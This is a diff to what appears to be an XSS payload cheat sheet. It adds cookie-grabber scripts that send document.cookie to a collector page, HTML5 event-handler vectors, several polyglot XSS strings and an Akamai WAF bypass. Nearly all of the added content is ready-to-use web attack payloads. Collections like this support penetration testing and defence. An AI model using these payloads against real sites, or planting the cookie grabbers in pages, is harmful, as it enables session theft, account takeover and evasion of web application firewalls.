@@ -19,7 +19,9 @@ Cookie grabber for XSS
 ```php
 <?php
 // How to use it
-# <script>document.location='http://localhost/XSS/grabber.php?c=' + document.cookie</script>
+<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
+or
+<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
 
 // Write the cookie in a file
 $cookie = $_GET['c'];
@@ -95,6 +97,11 @@ XSS for HTML5
 <details/open/ontoggle="alert`1`">
 <audio src onloadstart=alert(1)>
 <marquee onstart=alert(1)>
+<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>
+
+<body ontouchstart=alert(1)> // Triggers when a finger touch the screen
+<body ontouchend=alert(1)>   // Triggers when a finger is removed from touch screen
+<body ontouchmove=alert(1)>  // When a finger is dragged across the screen.
 ```
 
 XSS using script tag (external payload)
@@ -345,6 +352,22 @@ Polyglot XSS - [@s0md3v](https://twitter.com/s0md3v/status/966175714302144514)
 
 ```javascript
 <svg%0Ao%00nload=%09((pro\u006dpt))()//
+```
+
+Polyglot XSS - from [@filedescriptor's Polyglot Challenge](http://polyglot.innerht.ml)
+
+```javascript
+# by crlf
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+
+# by europa
+javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>
+
+# by EdOverflow
+javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
+
+# by h1/ragnar
+javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`
 ```
 
 ## Filter Bypass and exotic payloads
@@ -764,6 +787,12 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 
 ```javascript
 ?"></script><base%20c%3D=href%3Dhttps:\mysite>
+```
+
+### Akamai WAF Bypass by [@s0md3v](https://twitter.com/s0md3v/status/1056447131362324480) - 28th october
+
+```html
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
 ```
 
 ### WordFence WAF Bypass by @brutelogic - 12th september
